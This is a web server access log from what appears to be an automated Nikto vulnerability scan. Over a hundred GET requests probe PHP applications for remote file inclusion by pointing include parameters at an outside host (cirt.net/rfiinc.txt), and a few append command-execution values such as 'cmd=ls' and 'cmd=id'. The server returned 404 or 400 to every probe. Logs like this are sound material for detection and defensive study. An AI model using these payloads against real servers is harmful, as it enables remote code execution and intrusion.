172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/ShowContentModule/ShowContentModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003935)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/TakerATourModule/TakerATourModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003936)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/UploadMediaModule/UploadMediaModule.php?current_blockmodule_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003937)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/UserMessagesModule/UserMessagesModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003938)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/UserPhotoModule/UserPhotoModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003939)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/VideosMediaGalleryModule/VideosMediaGalleryModule.php?current_blockmodule_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 561 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003940)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BetaBlockModules/ViewAllMembersModule/ViewAllMembersModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003941)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Blog_CMS/admin/plugins/NP_UserSharing.php?DIR_ADMIN=http://cirt.net/rfiinc.txt??admin HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003942)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /BsiliX_path]/files/mbox-action.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003943)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /CSLH2_path/txt-db-api/util.php?API_HOME_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003944)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /CheckUpload.php?Language=http://cirt.net/rfiinc.txt?&cmd=ls HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003945)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/backend_search.php?contenido_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003946)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/move_articles.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003947)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/move_old_stats.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003948)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/optimize_database.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003949)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/run_newsletter_job.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003950)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/send_reminder.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003951)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/session_cleanup.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003952)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/cronjobs/setfrontenduserstate.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003953)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/includes/include.newsletter_jobs_subnav.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 560 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003954)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/includes/include.newsletter_jobs_subnav.php?cfg[path][templates]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 560 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003955)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/includes/include.newsletter_jobs_subnav.php?cfg[templates][right_top_blank]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 560 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003956)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/plugins/content_allocation/includes/include.right_top.php?cfg[path][contenido]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 574 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003957)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/plugins/content_allocation/includes/include.right_top.php?cfg[path][templates]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 574 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003958)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Contenido_4.8.4/contenido/plugins/content_allocation/includes/include.right_top.php?cfg[templates][right_top_blank]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 574 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003959)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /CoupleDB.php?Parametre=0&DataDirectory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003960)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_affiliate_client_API.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003961)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_featured_prdt.func.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003962)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_mer.func.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003963)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_mer_prdt.func.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003964)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_paging.func.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003965)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_rss.func.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003966)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_sku.func.php?DFF_config[dir_include]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003967)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DFF_PHP_FrameworkAPI-latest/include/DFF_sku.func.php?DFF_config[dir_include]http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003968)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DON3/applications/don3_requiem.don3app/don3_requiem.php?app_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003969)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DON3/applications/frontpage.don3app/frontpage.php?app_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003970)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Dir_phNNTP/article-raw.php?file_newsportal=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003971)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DynaTracker_v151/action.php?base_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003972)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /DynaTracker_v151/includes_handler.php?base_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003973)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Easysite-2.0_path/configuration/browser.php?EASYSITE_BASE=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003974)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Ex/modules/threadstop/threadstop.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003975)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Ex/modules/threadstop/threadstop.php?new_exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003976)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Exophpdesk_PATH/pipe.php?lang_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003977)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /FirstPost/block.php?Include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003978)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Flickrclient.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003979)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /FormTools1_5_0/global/templates/admin_page_open.php?g_root_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003980)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /FormTools1_5_0/global/templates/client_page_open.php?g_root_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003981)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Full_Release/include/body_comm.inc.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003982)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Gallery/displayCategory.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003983)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Include/lib.inc.php3?Include=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003984)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Include/variables.php3?Include=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003985)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Jobline/admin.jobline.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003986)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ListRecords.php?lib_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003987)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Lorev1/third_party/phpmailer/class.phpmailer.php?lang_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003988)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /MOD_forum_fields_parse.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003989)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Mamblog/admin.mamblog.php?cfgfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003990)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Net_DNS_PATH/DNS/RR.php?phpdns_basedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003991)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003992)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003993)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/indexFooter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003994)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/pages/pageHeader.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003995)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003996)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/FieldManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003997)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/Filter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003998)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003999)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/Form.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004000)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/FormManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004001)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /OpenSiteAdmin/scripts/classes/LoginManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004002)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /PHP/includes/header.inc.php?root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004003)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /PHPDJ_v05/dj/djpage.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004004)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /PHPDJ_v05/dj/djpage.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004005)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /PaTh/index.php?rootpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004006)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Path_Script/createurl.php?formurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004007)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /PhotoCart/adminprint.php?admin_folder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004008)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Picssolution/install/config.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004009)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Picssolution/install/config.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004010)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /RGboard/include/footer.php?_path[counter]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004011)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /SPIP-v1-7-2/inc-calcul.php3?squelette_cache=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004012)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /SQuery/lib/gore.php?libpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004013)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /SazCart/admin/alayouts/default/pages/login.php?_saz[settings][site_url]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004014)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /SazCart/layouts/default/header.saz.php?_saz[settings][site_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004015)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ScriptPage/source/includes/load_forum.php?mfh_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ScriptPath/footers.php?tinybb_footers=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004017)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ScriptPath/index.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004018)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Script_Path/config.inc.php?_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004019)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Scripts/app_and_readme/navigator/index.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004020)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004021)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Somery/team.php?checkauth=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004022)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Upload/install.php?skindir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004023)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Widgets/Base/Footer.php?sys_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004024)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Widgets/Base/widget.BifContainer.php?sys_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004025)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Widgets/Base/widget.BifRoot.php?sys_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004026)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Widgets/Base/widget.BifRoot2.php?sys_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004027)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Widgets/Base/widget.BifRoot3.php?sys_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004028)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /Widgets/Base/widget.BifWarning.php?sys_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004029)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /WordPress_Files/All_Users/wp-content/plugins/Enigma2.php?boarddir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004030)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /[path]/mybic_server.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004031)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /[path]/previewtheme.php?theme=1&inc_path=http://cirt.net/rfiinc.txt??cmd HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004032)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_administration/securite.php?cfg[document_uri]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004033)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_blogadata/include/struct_admin.php?incl_page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004034)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_conf/_php-core/common-tpl-vars.php?admindir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004035)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_connect.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004036)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_friendly/core/data/_load.php?friendly_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004037)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_friendly/core/data/yaml.inc.php?friendly_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004038)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_friendly/core/display/_load.php?friendly_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004039)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_friendly/core/support/_load.php?friendly_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004040)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_functions.php?prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004041)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004042)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_theme/breadcrumb.php?rootBase=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004043)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /_wk/wk_lang.php?WK[wkPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004044)"
